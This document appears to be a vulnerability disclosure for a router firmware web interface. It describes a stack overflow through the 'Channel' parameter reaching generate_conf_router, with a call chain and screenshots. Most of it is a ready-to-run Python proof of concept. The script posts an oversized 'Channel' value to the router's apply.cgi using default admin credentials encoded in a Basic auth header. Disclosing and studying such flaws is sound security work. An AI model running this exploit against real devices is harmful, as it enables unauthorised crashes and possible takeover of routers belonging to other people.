The `Channel` variable is passed in from the Web_URL and obtained via the `nvram_get` function in `generate_conf_router`, causing a stack overflow vulnerability that can lead to arbitrary command execution.

main-->sub_40C360-->start_lan-->start_wlan-->config_wlan-->generate_conf-->generate_conf_router
<img width="791" height="316" alt="image" src="https://github.com/user-attachments/assets/aeb5ce53-d690-41db-bf47-f1cfcf388621" />
<img width="500" height="228" alt="image" src="https://github.com/user-attachments/assets/ff761bbd-5fe1-49d1-ade5-029e32de0455" />
<img width="611" height="445" alt="image" src="https://github.com/user-attachments/assets/818f537f-5776-4207-860b-5a6c8a384b8e" />
<img width="850" height="524" alt="image" src="https://github.com/user-attachments/assets/22992204-d8a9-4b5e-83c8-b7d6ae5c813e" />
<img width="820" height="529" alt="image" src="https://github.com/user-attachments/assets/796003ee-0620-40e1-9749-89c22615401f" />
<img width="705" height="460" alt="image" src="https://github.com/user-attachments/assets/06e62d32-cf68-4c36-b269-71479f773959" />
<img width="705" height="460" alt="image" src="https://github.com/user-attachments/assets/043e44d0-4660-47aa-b665-077db96c9284" />
```
poc
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
AP Client - Channel Injection
"""

import requests
import json
from urllib.parse import urlencode

requests.packages.urllib3.disable_warnings()

request = {
    "name": "AP Client - Channel Injection",
    "method": "POST",
    "url": "http://192.168.10.1/apply.cgi",
    "referer": "http://192.168.10.1/apclient_scan.asp",
    "headers": {
        "Cache-Control": "max-age=0",
        "Authorization": "Basic YWRtaW46YWRtaW4=",
        "Upgrade-Insecure-Requests": "1",
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "zh-CN,zh;q=0.9",
        "Connection": "close",
    },
    "data": {
        "submit_button": "apclient_scan",
        "change_action": "",
        "wan_proto": "9",
        "action": "Apply",
        "wan_dns_enable": "1",
        "ApCliEnable": "1",
        "ApCliBssid": "",
        "Channel": "1" * 512,
        "ApClientBridgeEnable": "1",
        "wr_ApClientBridgeEnable": "on",
        "ApCliSsid": "Remote_AP_SSID",
        "ApCliAuthMode": "OPEN",
        "ApCliEncrypType": "NONE",
        "ApCli_wl_wep_len": "0",
        "ApCliDefaultKeyID": "1",
        "ApCliKey1Type": "0",
        "ApCliKey1Str": "**********",
        "ApCliKey2Type": "0",
        "ApCliKey2Str": "**********",
        "ApCliKey3Type": "0",
        "ApCliKey3Str": "**********",
        "ApCliKey4Type": "0",
        "ApCliKey4Str": "**********",
        "ApCliWPAEncrypType": "TKIP",
        "ApCliWPAPSK": "12345678",
    },
}


def send_request():
    """发送HTTP POST请求"""
    try:
        headers = request["headers"].copy()
        headers["Origin"] = "http://192.168.10.1"
        headers["Referer"] = request["referer"]

        print(f"[*] 发送请求: {request['name']}")
        print(f"[*] URL: {request['url']}")
        print(f"[*] Referer: {request['referer']}")
        print(
            f"[*] 数据长度: {sum(len(str(v)) for v in request['data'].values())} bytes\n"
        )

        response = requests.post(
            request["url"],
            data=request["data"],
            headers=headers,
            timeout=10,
            verify=False,
        )

        print(f"[+] 状态码: {response.status_code}")
        print(f"[+] 响应长度: {len(response.text)} bytes")
        print(f"[+] 响应头: {dict(response.headers)}\n")

        return response
    except Exception as e:
        print(f"[-] 错误: {e}\n")
        return None


if __name__ == "__main__":
    send_request()

```

